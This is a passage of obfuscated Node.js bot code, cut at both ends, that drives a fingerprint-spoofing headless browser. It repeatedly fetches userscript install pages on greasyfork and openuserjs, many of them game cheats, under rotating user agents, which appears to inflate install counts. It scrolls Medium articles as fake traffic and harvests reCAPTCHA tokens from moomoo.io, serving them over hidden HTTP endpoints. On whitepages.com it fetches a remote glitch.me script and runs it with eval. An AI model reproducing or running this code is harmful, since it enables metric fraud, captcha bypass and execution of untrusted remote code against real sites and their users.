      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + Y(0x18) + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + Y(0x0) + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Z(0xb) + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1589 + 0x9 * -0xcf + -0xe42
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x2287 * 0x1 + -0x14 * 0x16 + 0x1 * 0x243f)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0xb9 * 0x35 + -0x8ac + -0x1d3d), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1768 + -0x509 * 0x4 + -0x2e0), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1928 + -0x149 * 0xc + 0xe * -0xb2;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x27b * -0xf + -0x12c3 + 0x313 * -0x6; w < getRandomInt(-0x890 + -0x1c38 + 0x3 * 0xc43, -0x14d1 + 0x2146 + 0x2 * -0x638); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x2af * -0x59 + -0x498b + 0x4514);
        }
      }();
    }, -0xb * 0x45 + -0x115b + 0x14b6), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x689 * 0x2 + 0x8e7 + 0x42b;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x6d3 + -0x3ed * -0x2 + 0x11 * -0xdd, -0x1a7d + -0x1b1c + 0x35cb)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0xdc40 + -0x31f3 + 0x18363);
    }, -0x2221 + -0x4c7 * 0x1 + 0x274c), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1303 + -0x26c9 * -0x1 + -0x13c6;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x1 * 0x2665 + 0x13ec + -0x2e99), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0xc2 * 0x1 + 0xb50 * 0x1 + 0x547 * -0x2), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x1cc70 + 0x48e80 + 0xaf990);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x1f64 + -0xb7 + 0x207f);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const a0 = b,
      i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x7e9 + 0x1ca * -0x7 + -0x1537 * -0x1);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + a0(0x5, 'OJVU') + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x1c36 + 0x16e8 + 0x24de);
}
doFlags['doOUJS'] && ((async () => {
  const a3 = b;
  async function f() {
    const a2 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x1 * 0xf72 + 0x11c5 + 0x12 * -0x21) {
        const a1 = c;
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x229d + -0xcdc + -0x15c0));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x1e64 + -0x1302 * -0x1 + 0xb62, D[a1(0x19)]('\x20'));
        return B ? E['slice'](0x3ab + 0x4e7 + -0x892, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x3641 + 0x2a9d + 0xe * -0x421),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + a2(0x15) + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x59d + 0x74f * 0x7 + -0x67c),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + a3(0x12, 'F#*^') + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0xce9 * 0x3 + 0x22bc + 0x5d * 0xb; k < -0x28e * -0xb + -0x2aa + 0x1 * -0x196c; k++)
    setTimeout(f, (0xc145 * 0x1 + -0x1042d + -0x4dc * -0x3e) * k * getRandomInt(-0x121 + 0x389 + -0x7b * 0x5, 0x1ce6 + -0x13e * 0x1e + 0x861));
  setInterval(() => {
    f();
    for (let l = 0x12b9 * 0x1 + -0x165 + 0x2 * -0x8aa; l < 0x5df + -0x944 + 0x369; l++)
      setTimeout(f, (-0xbd41 * -0x1 + 0x1bcc5 + -0x18fa6) * l * getRandomInt(0x2 * -0xe82 + 0x2e3 + 0x1a22, 0x172a + -0x9aa + -0x47f * 0x3));
  }, -0x2 * 0xb2033 + -0x1 * 0x2cc34b + 0x79f231);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
